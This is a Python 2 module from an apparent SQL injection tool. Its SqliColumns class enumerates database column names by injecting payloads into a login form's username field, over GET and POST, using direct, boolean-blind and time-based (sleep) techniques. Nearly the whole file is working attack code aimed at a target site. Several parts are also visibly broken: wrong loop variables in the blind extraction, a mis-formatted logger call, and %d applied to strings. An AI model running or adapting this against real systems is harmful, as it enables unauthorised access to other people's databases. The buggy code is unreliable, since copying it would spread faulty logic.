#!/usr/bin/env python
# -*- coding:utf-8 -*-
from config import UnpackFunction
from lib.log import logger
from tables import SqliTables

__author__ = "LoRexxar"


class SqliColumns(SqliTables):
    def __init__(self):
        SqliTables.__init__(self)
        self.columns_name = []
        if self.tables_name == 0:
            SqliTables.get_tables(self)

    # 获取列名
    def get_columns(self):

        # 每个tables_name需要跑一次columns_name
        for tables_name in self.tables_name:

            # 开始跑columns_name
            logger.info("Start sqli databases %s tables %s..." % self.database, tables_name)

            # 先GET
            if self.sqlirequest == "GET":
                logger.info("The sqlirequest is %s, start sqli columns..." % self.sqlirequest)

                if self.sqlimethod == "normal":

                    logger.info("The sqlimethod is %s..." % self.sqlimethod)
                    # 先注columns的数量
                    payload = "username=admi' or SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit 0,1%23&passwd=ddog123&submit=Log+In"
                    r = self.Data.GetData(payload)
                    columns_number = int(UnpackFunction(r))
                    logger.info("Columns account sqli success...The columns_number is %d..." % columns_number)
                    print "[*] columns_number: %d" % columns_number

                    # 每个循环跑一次columns的数据
                    for i in range(0, int(columns_number)):
                        # 首先是columns name的长度
                        payload = "username=a' or SELECT length(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(i) + ",1%23&passwd=ddog123&submit=Log+In"
                        r = self.Data.GetData(payload)
                        columns_name_len = int(UnpackFunction(r))
                        logger.info("Columns name length sqli success...The columns_name_len is %d..." % columns_name_len)
                        print "[*] columns_name_len: %d" % columns_name_len

                        # 然后注columns name
                        payload = "username=ad' or SELECT column_name from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(i) + ",1)%23&passwd=ddog123&submit=Log+In"
                        r = self.Data.GetData(payload)
                        columns_name = UnpackFunction(r)
                        logger.info("Columns name sqli success...The columns_name is %d..." % columns_name)
                        # 把columns_name插入列表
                        self.columns_name.append(columns_name)
                        print "[*] columns_name: %s" % columns_name

                elif self.sqlimethod == "build":

                    logger.info("The sqlimethod is %s..." % self.sqlimethod)
                    for i in range(0, 100):
                        # 先注columns的数量
                        payload = "username=admi' or SElECT ((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit 0,1) > " + repr(
                            i) + ")%23&passwd=ddog123&submit=Log+In"
                        if self.Data.GetBuildData(payload, self.len) == 0:
                            columns_number = i
                            break

                    logger.info("Columns amount sqli success...The columns_number is %d..." % columns_number)
                    print "[*] columns_number: %d" % columns_number

                    for i in range(0, int(columns_number)):
                        # 然后注columns_name 的 length
                        for j in range(0, 30):
                            payload = "username=admi' or select ((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
                                i) + ",1) > " + repr(j) + ")%23&passwd=ddog123&submit=Log+In"
                            if self.Data.GetBuildData(payload, self.len) == 0:
                                columns_name_len = i
                                break

                        logger.info("Columns name length sqli success...The columns_name_len is %d..." % columns_name_len)
                        print "[*] columns_name_len: %d" % columns_name_len

                        # 然后注columns名字
                        for j in range(0, int(columns_name_len)):
                            for k in range(30, 130):
                                payload = "username=admi' or select (SELECT ascii(substring(column_name," + repr(
                                    j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
                                    i) + ",1) >" + repr(k) + "))%23&passwd=ddog123&submit=Log+In"
                                if self.Data.GetBuildData(payload, self.len) == 0:
                                    columns_name += chr(int(j))
                                    break

                        logger.info("Columns name sqli success...The columns_name is %d..." % columns_name)
                        # 把columns_name插入列表
                        self.columns_name.append(columns_name)
                        print "[*] columns_name:" + columns_name

                elif self.sqlimethod == "time":

                    logger.info("The sqlimethod is %s..." % self.sqlimethod)
                    for i in range(0, 100):

                        # 先注columns的数量
                        payload = "username=admi' or SELECT if((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit 0,1) > " + repr(
                            i) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"
                        if self.Data.GetTimeData(payload, self.time) == 0:
                            columns_number = i
                            break

                    logger.info("Columns amount sqli success...The columns_number is %d..." % columns_number)
                    print "[*] columns_number: %d" % columns_number

                    for i in range(0, int(columns_number)):
                        # 然后注columns_number 的length
                        for j in range(0, 30):
                            payload = "username=admi' or SELECT if((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
                                i) + ",1) > " + repr(j) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"

                            if self.Data.GetTimeData(payload, self.time) == 0:
                                columns_name_len = i
                                break

                        logger.info("Columns name length sqli success...The database_len is %d..." % columns_name_len)
                        print "[*] columns_name_len: %d" % columns_name_len

                        # 然后注columns名字
                        for j in range(0, int(columns_name_len)):
                            for k in range(30, 130):
                                payload = "username=admi' or SELECT if((SELECT  ascii(substring(column_name," + repr(
                                    j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
                                    i) + ",1) > " + repr(k) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"

                                if self.Data.GetTimeData(payload, self.time) == 0:
                                    columns_name += chr(int(j))
                                    break

                        logger.info("Columns name sqli success...The columns_name is %d..." % columns_name)
                        # 把columns_name插入列表
                        self.columns_name.append(columns_name)
                        print "[*] columns_name:" + columns_name

            # 然后是post
            elif self.sqlirequest == "POST":
                logger.info("The sqlirequest is %s, start sqli tables..." % self.sqlirequest)

                if self.sqlimethod == "normal":

                    logger.info("The sqlimethod is %s..." % self.sqlimethod)
                    # 先注columns的数量
                    payload = {
                        "username": "admi' or SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit 0,1%23",
                        "passwd": "ddog123"}
                    r = self.Data.PostData(payload)
                    columns_number = int(UnpackFunction(r))
                    logger.info("Columns account sqli success...The columns_number is %d..." % columns_number)
                    print "[*] columns_number: %d" % columns_number

                    # 每个循环跑一次columns的数据
                    for i in range(0, int(columns_number)):
                        # 首先是tablename的长度
                        payload = {
                            "username": "a' or SELECT length(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
                                i) + ",1%23", "passwd": "ddog123&submit=Log+In"}
                        r = self.Data.PostData(payload)
                        columns_name_len = int(UnpackFunction(r))
                        logger.info("Columns name length sqli success...The columns_name_len is %d..." % columns_name_len)
                        print "[*] columns_name_len: %d" % columns_name_len

                        # 然后注columns_name
                        payload = {
                            "username": "ad' or SELECT column_name from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
                                i) + ",1)%23", "passwd": "ddog123"}
                        r = self.Data.PostData(payload)
                        columns_name = UnpackFunction(r)
                        logger.info("Columns name sqli success...The tables_name_len is %d..." % tables_name)
                        # 把columns_name插入列表
                        self.columns_name.append(columns_name)
                        print "[*] columns_name: %s" % columns_name

                elif self.sqlimethod == "build":

                    logger.info("The sqlimethod is %s..." % self.sqlimethod)
                    for i in range(0, 100):
                        # 先注columns的数量
                        payload = {
                            "username": "admi' or SElECT ((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit 0,1) > " + repr(
                                i) + ")%23", "passwd": "ddog123"}
                        if self.Data.PostBuildData(payload, self.len) == 0:
                            columns_number = i
                            break

                    logger.info("Columns amount sqli success...The columns_number is %d..." % columns_number)
                    print "[*] columns_number: %d" % columns_number

                    for i in range(0, int(columns_number)):
                        # 然后注columns_name 的 length
                        for j in range(0, 30):
                            payload = {
                                "username": "admi' or select ((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
                                    i) + ",1) > " + repr(j) + ")%23", "passwd": "ddog123"}
                            if self.Data.PostBuildData(payload, self.len) == 0:
                                columns_name_len = i
                                break

                        logger.info("Columns name length sqli success...The columns_name_len is %d..." % columns_name_len)
                        print "[*] columns_name_len: %d" % columns_name_len

                        # 然后注columns名字
                        for j in range(0, int(columns_name_len)):
                            for k in range(30, 130):
                                payload = {"username": "admi' or select (SELECT ascii(substring(column_name," + repr(
                                    j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
                                    i) + ",1) >" + repr(k) + "))%23", "passwd": "ddog123"}
                                if self.Data.PostBuildData(payload, self.len) == 0:
                                    columns_name += chr(int(j))
                                    break

                        logger.info("Columns name sqli success...The columns_name is %d..." % columns_name)
                        # 把columns_name插入列表
                        self.columns_name.append(columns_name)
                        print "[*] columns_name:" + columns_name

                elif self.sqlimethod == "time":

                    logger.info("The sqlimethod is %s..." % self.sqlimethod)
                    for i in range(0, 100):

                        # 先注columns的数量
                        payload = {
                            "username": "admi' or SELECT if((SELECT COUNT(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit 0,1) > " + repr(
                                i) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}
                        if self.Data.PostTimeData(payload, self.time) == 0:
                            columns_number = i
                            break

                    logger.info("Columns amount sqli success...The columns_number is %d..." % columns_number)
                    print "[*] columns_number: %d" % columns_number

                    for i in range(0, int(columns_number)):
                        # 然后注columns_name 的length
                        for j in range(0, 30):
                            payload = {
                                "username": "admi' or SELECT if((SELECT length(column_name) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
                                    i) + ",1) > " + repr(j) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}

                            if self.Data.PostTimeData(payload, self.time) == 0:
                                columns_name_len = i
                                break

                        logger.info("Columns name length sqli success...The database_len is %d..." % columns_name_len)
                        print "[*] columns_name_len: %d" % columns_name_len

                        # 然后注columns名字
                        for j in range(0, int(columns_name_len)):
                            for k in range(30, 130):
                                payload = {"username": "admi' or SELECT if((SELECT  ascii(substring(column_name," + repr(
                                    j + 1) + ",1)) from information_schema.columns WHERE table_name = '" + tables_name + "' limit " + repr(
                                    i) + ",1) > " + repr(k) + ",sleep(" + self.time + "),0)%23", "passwd": "ddog123"}

                                if self.Data.PostTimeData(payload, self.time) == 0:
                                    columns_name += chr(int(j))
                                    break

                        logger.info("Columns name sqli success...The columns_name is %d..." % columns_name)
                        # 把columns_name插入列表
                        self.columns_name.append(columns_name)
                        print "[*] columns_name:" + columns_name
